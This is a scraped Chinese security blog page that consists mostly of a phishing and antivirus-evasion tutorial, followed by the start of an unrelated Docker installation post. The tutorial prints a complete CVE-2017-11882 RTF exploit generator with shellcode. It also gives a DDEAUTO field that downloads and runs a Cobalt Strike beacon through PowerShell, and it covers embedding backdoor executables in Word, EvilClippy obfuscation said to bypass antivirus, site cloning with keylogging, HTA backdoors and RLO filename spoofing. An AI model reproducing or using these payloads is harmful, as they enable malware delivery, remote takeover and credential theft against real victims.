<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MicrosoftOffice 2000</span><br><span class="line">MicrosoftOffice 2003</span><br><span class="line">MicrosoftOffice 2007 Service Pack 3</span><br><span class="line">MicrosoftOffice 2010 Service Pack 2</span><br><span class="line">MicrosoftOffice 2013 Service Pack 1</span><br><span class="line">MicrosoftOffice 2016</span><br><span class="line">MicrosoftOffice 365</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># Original poc :https://github.com/embedi/CVE-2017-11882</span><br><span class="line"># This version accepts a command with 109 bytes long in maximum.</span><br><span class="line"># Sorry I don&#x27;t know how to read the struct in objdata, hence I cannot modify the length parameter to aquire a arbitrary length code execution.</span><br><span class="line"># But that&#x27;s enough in exploitation. We can use regsvr32 to load sct file remotely.:)</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head=r&#x27;&#x27;&#x27;&#123;\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033&#123;\fonttbl&#123;\f0\fnil\fcharset0 Calibri;&#125;&#125;</span><br><span class="line">&#123;\*\generator Riched20 6.3.9600&#125;\viewkind4\uc1</span><br><span class="line">\pard\sa200\sl276\slmult1\f0\fs22\lang9&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">objclass=r&#x27;&#x27;&#x27;&#123;\object\objemb\objupdate&#123;\*\objclass Equation.3&#125;\objw380\objh260&#123;\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tail=r&#x27;&#x27;&#x27;</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000</span><br><span class="line">&#125;&#123;\result &#123;\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 &#123;\pict&#123;\*\picprop\shplid1025&#123;\sp&#123;\sn shapeType&#125;&#123;\sv 75&#125;&#125;&#123;\sp&#123;\sn fFlipH&#125;&#123;\sv 0&#125;&#125;</span><br><span class="line">&#123;\sp&#123;\sn fFlipV&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLockAspectRatio&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn pictureGray&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn pictureBiLevel&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fRecolorFillAsPicture&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fUseShapeAnchor&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fFilled&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fHitTestFill&#125;&#123;\sv 1&#125;&#125;</span><br><span class="line">&#123;\sp&#123;\sn fillShape&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn fillUseRect&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fNoFillHitTest&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLine&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fPreferRelativeResize&#125;&#123;\sv 1&#125;&#125;&#123;\sp&#123;\sn fReallyHidden&#125;&#123;\sv 0&#125;&#125;</span><br><span class="line">&#123;\sp&#123;\sn fScriptAnchor&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fFakeMaster&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fCameFromImgDummy&#125;&#123;\sv 0&#125;&#125;&#123;\sp&#123;\sn fLayoutInCell&#125;&#123;\sv 1&#125;&#125;&#125;\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0</span><br><span class="line">\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307&#123;\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652&#125;0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span><br><span class="line">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000&#125;&#125;&#125;&#125;\par&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#0:  b8 44 eb 71 12          mov    eax,0x1271eb44</span><br><span class="line">#5:  ba 78 56 34 12          mov    edx,0x12345678</span><br><span class="line">#a:  31 d0                   xor    eax,edx</span><br><span class="line">#c:  8b 08                   mov    ecx,DWORD PTR [eax]</span><br><span class="line">#e:  8b 09                   mov    ecx,DWORD PTR [ecx]</span><br><span class="line">#10: 8b 09                   mov    ecx,DWORD PTR [ecx]</span><br><span class="line">#12: 66 83 c1 3c             add    cx,0x3c</span><br><span class="line">#16: 31 db                   xor    ebx,ebx</span><br><span class="line">#18: 53                      push   ebx</span><br><span class="line">#19: 51                      push   ecx</span><br><span class="line">#1a: be 64 3e 72 12          mov    esi,0x12723e64</span><br><span class="line">#1f: 31 d6                   xor    esi,edx</span><br><span class="line">#21: ff 16                   call   DWORD PTR [esi] // call WinExec</span><br><span class="line">#23: 53                      push   ebx</span><br><span class="line">#24: 66 83 ee 4c             sub    si,0x4c</span><br><span class="line">#28: ff 10                   call   DWORD PTR [eax] // call ExitProcess</span><br><span class="line">stage1=&quot;\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pads with nop</span><br><span class="line">stage1=stage1.ljust(44,&#x27;\x90&#x27;)</span><br><span class="line"></span><br><span class="line">def genrtf(cmd,r_head):</span><br><span class="line">    if len(cmd) &gt; 109:</span><br><span class="line">        print &quot;[!] Primitive command must be shorter than 109 bytes&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    payload=&#x27;\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ&#x27;</span><br><span class="line">    payload+=stage1</span><br><span class="line">    payload+=pack(&#x27;&lt;I&#x27;,0x00402114) # ret</span><br><span class="line">    payload+=&#x27;\x00&#x27;*2</span><br><span class="line">    payload+=cmd</span><br><span class="line">    payload=payload.ljust(197,&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">    return r_head+objclass+payload.encode(&#x27;hex&#x27;)+tail</span><br><span class="line"></span><br><span class="line">def getrheader(file):</span><br><span class="line">    input_file = open(file,&quot;r&quot;).read()</span><br><span class="line">    r_header = input_file.split(&quot;&#123;\*\datastore&quot;)[0]</span><br><span class="line">    return r_header</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&quot;PoC for CVE-2017-11882&quot;)</span><br><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command run in target system&quot;, required=True)</span><br><span class="line">    parser.add_argument(&#x27;-o&#x27;, &quot;--output&quot;, help=&quot;Output exploit rtf&quot;, required=True)</span><br><span class="line">    parser.add_argument(&quot;-i&quot;, &quot;--input&quot;, help=&quot;Input normal rtf.&quot;, required=False)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if args.input != None:</span><br><span class="line">        r_header = getrheader(args.input)</span><br><span class="line">    else:</span><br><span class="line">        r_header = head</span><br><span class="line"></span><br><span class="line">    with open(args.output,&#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(genrtf(args.cmd,r_header))</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    print &quot;[*] Done ! output file --&gt; &quot; + args.output </span><br><span class="line">python2 Command109b_CVE-2017-11882.py -c &quot;calc&quot; -o poc.doc</span><br></pre></td></tr></table></figure>

<p>生成 poc.doc 放到靶机上执行，靶机弹出计算机，可以把 calc 换成 powershell 下载后门命令</p>
<h3 id="word插入外部对象上线"><a href="#word插入外部对象上线" class="headerlink" title="word插入外部对象上线"></a>word插入外部对象上线</h3><p>插入-&gt;对象</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-37-1024x104.png" alt="img"></p>
<p>插入 Cobalt Strike 生成的 exe 后门文件，然后显示为图标，更改图标，改个题注，可以把图标也换一下</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-38.png" alt="img"></p>
<p>在word里面多出来这个</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-39.png" alt="img"></p>
<p>点击后，靶机上线</p>
<h3 id="word文档构造DDE"><a href="#word文档构造DDE" class="headerlink" title="word文档构造DDE"></a>word文档构造DDE</h3><p>创建一个docx文档，然后快捷键 Ctrl+f9 快速创建一个域，在花括号填入如下指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;\/k calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-40.png" alt="img"></p>
<p>放到靶机上执行，靶机会弹出计算机，可以把计算机换成其它上线命令</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-41.png" alt="img"></p>
<p>比如用powershell上线，先生成木马</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-42.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-43.png" alt="img"></p>
<p>在保存木马的地方用 python -m http.server 8080 开启简易web服务</p>
<p>{}内写如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO &quot;C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP</span><br><span class="line">-sta -NonI -W Hidden IEX (New-Object</span><br><span class="line">System.Net.WebClient).DownloadString(&#x27;http://192.168.137.1:8080/beacon.exe&#x27;)</span><br><span class="line">; # &quot; &quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure>

<p>放到靶机上执行，即可上线</p>
<h3 id="word免杀"><a href="#word免杀" class="headerlink" title="word免杀"></a>word免杀</h3><p><a target="_blank" rel="noopener" href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p>
<p>编译：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1570">https://forum.butian.net/share/1570</a></p>
<p>原理：利用工具，将安全的vba代码，和带有木马word混淆</p>
<p>编写 1.vba</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub Hello()</span><br><span class="line">Dim X</span><br><span class="line">X=MsgBox(&quot;Hello VBS&quot;)</span><br></pre></td></tr></table></figure>

<p>生成恶意文档 1_EvilClippy.doc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\EvilClippy.exe -s 1.vba 1.doc</span><br></pre></td></tr></table></figure>

<p>这里的1.doc就是上面“word”模块生成的</p>
<p>可过火绒&#x2F;360</p>
<p>其他免杀：<a target="_blank" rel="noopener" href="https://skewwg.github.io/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/">https://skewwg.github.io/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/</a></p>
<h2 id="IQY特性钓鱼"><a href="#IQY特性钓鱼" class="headerlink" title="IQY特性钓鱼"></a>IQY特性钓鱼</h2><p>可以将IYQ简单的理解成内置在excel中的一种特殊‘web浏览器’（不能加载脚本），通过IQY【即web查询】语句，可以直接将各类web上的列表数据轻松引入到当前的excel中，而正是因为这样，从而给了我们利用excel制作钓鱼邮件的机会，假如你要引入的web数据是入侵者事先准备好的一段payload iqy恶意代码，那结果就不言而喻了。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/askta0/p/10893535.html#/c/subject/p/10893535.html">https://www.cnblogs.com/askta0/p/10893535.html#/c/subject/p/10893535.html</a></p>
<h2 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42516903/article/details/112398825">https://blog.csdn.net/weixin_42516903/article/details/112398825</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ITmincherry/article/details/105716951">https://blog.csdn.net/ITmincherry/article/details/105716951</a></p>
<p>工具包：<a target="_blank" rel="noopener" href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-44.png" alt="img"></p>
<p>注意端口不要冲突，把键盘记录打开</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-45.png" alt="img"></p>
<p>我这里直接克隆会报错，可以使用其他工具克隆，然后放在本地，在克隆本地即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：wget -r -p -np -k https://www.baidu.com</span><br></pre></td></tr></table></figure>

<h2 id="flash钓鱼"><a href="#flash钓鱼" class="headerlink" title="flash钓鱼"></a>flash钓鱼</h2><p>原理：捆绑文件+克隆网站</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/god_zzZ/article/details/104192518">https://blog.csdn.net/god_zzZ/article/details/104192518</a></p>
<p>flash源码 <a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a></p>
<h2 id="BadUsb"><a href="#BadUsb" class="headerlink" title="BadUsb"></a>BadUsb</h2><p>BadUSB是利用了USB协议上的漏洞，通过更改USB的内部固件，在正常的USB接口接入后，模拟外置鼠标、键盘的功能，以此来使目标主机执行已经精心构造好的命令。在此过程中不会引起杀毒软件、防火墙的一丝怀疑。而且因为是在固件级别的应用，U盘格式化根本无法阻止其内部代码的执行。</p>
<h2 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h2><p>准确的说 HTML Application 并不是一个后门上线方式，而是其本身就是一个后门程序，只是其文件后缀为 hta 比较隐蔽所以放到这里了。</p>
<p>将 HTML 保存为 .hta 后缀即可生成 HTML Application 程序，HTML Application 可以用 vbscript 或者 jscript 编写，可以编写一个 HTML Application 程序后门，目标执行了就会被获取 shell。（Cobalt Strike 生成的 HTML Application 程序后门是用 vbscript 编写的）</p>
<p>Cobalt Strike 生成 HTML Application 类型后门</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-46.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-47.png" alt="img"></p>
<p>方法选择 powershell 类型，这样生成的 HTML Application 程序是以 powershell 执行命令的，也就是 HTML Application 调用 powershell</p>
<p>放到靶机上执行后门文件， Cobalt Strike 即可获取到 shell</p>
<h2 id="一些隐藏小技巧"><a href="#一些隐藏小技巧" class="headerlink" title="一些隐藏小技巧"></a>一些隐藏小技巧</h2><h3 id="文件名反转"><a href="#文件名反转" class="headerlink" title="文件名反转"></a>文件名反转</h3><p>在文件名中插入 RLO unicode 字符，可以反转文件名，比如把前面 HTML Application 程序后门进行文件名反转</p>
<p>先改个名字，<code>shelltxt.hta</code>，选中shell后面，txt前面</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-48.png" alt="img"></p>
<p>文件名反转</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-49.png" alt="img"></p>
<h3 id="更改图标"><a href="#更改图标" class="headerlink" title="更改图标"></a>更改图标</h3><p>工具：ResourceHacker</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jj0219/p/11398356.html">https://www.cnblogs.com/jj0219/p/11398356.html</a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w">https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&mid=2247487419&idx=1&sn=06f9f8934611cce555d9bd76464f404f">https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247487419&amp;idx=1&amp;sn=06f9f8934611cce555d9bd76464f404f</a></p>
<p>（文中提到的工具可联系作者获取）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/01/11/%E9%92%93%E9%B1%BC%E5%8F%8A%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80/" data-id="cln8hm0vh0000dgtg6s2zd91n" data-title="钓鱼及部分免杀" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Docker基础" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/13/Docker%E5%9F%BA%E7%A1%80/" class="article-date">
  <time class="dt-published" datetime="2022-07-13T08:01:04.000Z" itemprop="datePublished">2022-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/13/Docker%E5%9F%BA%E7%A1%80/">Docker基础</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>官网：<a target="_blank" rel="noopener" href="https://www.docker.com/">https://www.docker.com</a></p>
<p>文档：<a target="_blank" rel="noopener" href="https://docs.docker.com/">https://docs.docker.com</a></p>
<p>仓库地址：<a target="_blank" rel="noopener" href="https://hub.docker.com/">https://hub.docker.com</a></p>
<p>系统内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r     #3.10以上</span><br></pre></td></tr></table></figure>

<p>系统版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/os-release</span><br></pre></td></tr></table></figure>

<p>安装（CentOS）</p>
<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1.卸载旧版本</span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br><span class="line">                  </span><br><span class="line">2.需要的安装包</span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line"></span><br><span class="line">3.设置镜像仓库</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">    </span><br><span class="line">更新软件包索引</span><br><span class="line">sudo yum makecache fast</span><br><span class="line">    </span><br><span class="line">4.安装   docker-ce社区版 ee 企业版</span><br><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br><span class="line"></span><br><span class="line">5.启动docker</span><br><span class="line">sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">6.检查是否安装成功</span><br><span class="line">docker version</span><br><span class="line"></span><br><span class="line">7.hello-world</span><br><span class="line">sudo docker run hello-world</span><br><span class="line"></span><br><span class="line">8.查看hello-world镜像</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p>注意：以上内容以官方文档为准</p>
<p>阿里云镜像加速器</p>
